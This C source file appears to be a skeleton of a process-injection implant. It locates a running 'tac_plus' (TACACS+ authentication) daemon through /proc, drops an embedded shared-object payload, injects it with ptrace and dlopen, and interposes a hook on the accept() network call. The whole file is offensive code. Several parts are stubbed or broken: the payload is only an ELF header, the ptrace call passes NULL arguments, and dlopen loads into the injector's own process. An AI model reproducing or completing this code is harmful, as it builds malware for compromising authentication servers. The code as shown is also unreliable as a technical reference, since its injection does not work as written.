#include <dlfcn.h>
#include <linux/limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

static const unsigned char embedded_shared_object[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00
};

static int find_process_by_comm(const char *target) {
    static const char *default_target = "tac_plus";
    char path[PATH_MAX];
    char name[64];

    if (!target) target = default_target;

    for (int pid = 2; pid < 65535; ++pid) {
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        FILE *fp = fopen(path, "r");
        if (fp && fgets(name, sizeof(name), fp) && strstr(name, target)) {
            fclose(fp);
            return pid;
        }
        if (fp) fclose(fp);
    }
    return -1;
}

static int maps_contains(int pid, const char *so_path) {
    char path[PATH_MAX];
    char line[512];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *fp = fopen(path, "r");
    if (!fp) return 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, so_path)) {
            fclose(fp);
            return 1;
        }
    }
    fclose(fp);
    return 0;
}

static void write_embedded_payload(const char *path) {
    FILE *fp = fopen(path, "wb");
    if (!fp) return;
    fwrite(embedded_shared_object, sizeof(embedded_shared_object), 1, fp);
    fclose(fp);
}

static void inject_shared_object(int pid, const char *path) {
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    ptrace(PTRACE_POKETEXT, pid, NULL, NULL);
    dlopen(path, RTLD_NOW);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}

static int plthook_replace(void *a,const char*b,void*c,void**d) {
 (void)a; (void)b; (void)c; (void)d; return 0;
}
static void *resolve_original(void) { return dlsym(RTLD_NEXT, "accept"); }

int accept(int fd, struct sockaddr *addr, socklen_t *len) {
 int (*original)(int, struct sockaddr *, socklen_t *) = dlsym(RTLD_NEXT, "accept");
 return original(fd, addr, len);
}
